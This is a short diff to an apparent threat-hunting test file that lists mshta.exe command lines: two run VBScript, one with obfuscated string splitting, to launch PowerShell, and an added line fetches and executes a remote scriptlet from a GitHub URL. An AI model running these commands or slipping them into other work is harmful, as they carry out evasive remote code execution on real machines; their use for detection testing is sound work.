@@ -3,3 +3,5 @@ Command:
 mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe"""))</script>'"
 
 mshta.exe vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)
+
+mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/PS1.sct')).Exec();close();
